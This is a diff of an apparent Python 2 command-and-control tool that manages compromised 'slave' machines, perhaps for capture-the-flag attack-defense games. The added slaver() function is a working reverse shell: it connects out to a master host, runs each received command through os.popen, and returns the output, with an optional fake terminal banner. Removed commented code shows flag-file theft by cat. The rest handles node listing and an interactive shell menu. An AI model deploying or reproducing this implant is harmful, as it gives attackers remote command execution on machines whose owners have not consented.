@@ -8,10 +8,6 @@ import sys
 import os
 import readline
 
-from slave import slaver
-from slave import recvall
-from slave import recvuntil
-
 slaves = {}
 
 MAX_CONNECTION_NUMBER = 0x10
@@ -19,26 +15,39 @@ MAX_CONNECTION_NUMBER = 0x10
 def md5(data):
     return hashlib.md5(data).hexdigest()
 
-'''
-def transfer(i, o, is_socket):
-    buffer_size = 0x100
-    while True:
-        if is_socket:
-            buffer = raw_input("$ ") or ("")
-        else:
-            buffer = o.recv(buffer_size)
-        if len(buffer) == 0:
-            print "[-] No data, Breaking..."
-        if is_socket:
-            i.send(buffer)
-        else:
-            print "[+] BUffer : %s" % (buffer)
-    if is_socket:
-        i.shutdown(socket.SHUT_RDWR)
-        i.close()
-        # TODO : remove from slaves
+def recvuntil(p, target):
+    data = ""
+    while target not in data:
+        data += p.recv(1)
+    return data
 
-'''
+def recvall(socket_fd):
+    data = ""
+    size = 0x10
+    while True:
+        r = socket_fd.recv(size)
+        data += r
+        if len(r) < size:
+            break
+    return data
+
+def slaver(host, port, fake):
+    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    slaver_fd.connect((host, port))
+    banner = "[FakeTerminal] >> "
+    while True:
+        command = recvuntil(slaver_fd, "\n")
+        if fake:
+            slaver_fd.send(banner)
+        # print "[+] Executing : %r" % (command)
+        try:
+            result = os.popen(command).read()
+        except:
+            result = ""
+        slaver_fd.send(command + result)
+    print "[+] Closing connection..."
+    slaver_fd.shutdown(socket.SHUT_RDWR)
+    slaver_fd.close()
 
 def transfer(h):
     slave = slaves[h]
@@ -71,19 +80,6 @@ class Slave():
         print "[+] Hash : %s" % (self.node_hash)
         print "[+] IP : %s" % (self.hostname)
         print "[+] Port : %s" % (self.port)
-        # print "[+] Banner : %s" % (self.banner)
-
-    '''
-    def shell_exec(self, shell_command):
-        print "[+] Command : %s" % (shell_command)
-        try:
-            self.socket_fd.send(shell_command)
-        except:
-            return False
-        time.sleep(0.5)
-        result = recvall(self.socket_fd)
-        return result
-    '''
 
     def send_command(self, command):
         try:
@@ -92,7 +88,6 @@ class Slave():
         except:
             self.remove_node()
             return False
-
 
     def interactive_shell(self):
         t = threading.Thread(target=transfer, args=(self.node_hash, ))
@@ -109,19 +104,6 @@ class Slave():
     def remove_node(self):
         print "[+] Removing Node!"
         slaves.pop(self.node_hash)
-
-    '''
-    def get_flag_file(self, flag_path):
-        # result = self.shell_exec("python -c 'with open(\"%s\") as f:print \">%%s<\" %% f.read().encode('hex').encode('base64');'" % (flag_path))
-        command = "cat %s" % (flag_path)
-        self.socket_fd.send(command)
-        with open("flag.log", "a+") as f:
-            f.write("-" * 0x10 + "\n")
-            f.write("IP : %s\n" % (self.hostname))
-            f.write("PORT : %s\n" % (self.port))
-            f.write("Flag : %r\n" % (result))
-        return result
-        '''
 
 def master(host, port):
     print "[+] Master starting at %s:%d" % (host, port)
@@ -246,29 +228,9 @@ def main():
                 print "[-] Executing command failed! Connection aborted! Node removed!"
                 position = slaves.keys()[0]
                 print "[+] Position changed to : %s" % (position)
-
         elif command == "i":
             slave = slaves[position]
             slave.interactive_shell()
-            '''
-        elif command == "c":
-            slave = slaves[position]
-            shell_command = raw_input("$ ") or ""
-            if shell_command == "":
-                print "[-] Please input your command!"
-            else:
-                print "[+] Executing : %s" % (repr(shell_command))
-                result = slave.shell_exec(shell_command + "\n")
-                if result:
-                    print "[+] Executing command success!"
-                    print "[%s]" % ("-" * 0x10)
-                    print result
-                else:
-                    slave.remove_node()
-                    print "[-] Executing command failed! Connection aborted! Node removed!"
-                    position = slaves.keys()[0]
-                    print "[+] Position changed to : %s" % (position)
-                    '''
         elif command == "q" or command == "quit" or command == "exit":
             # TODO : release all resources before closing
             print "[+] Releasing resources..."
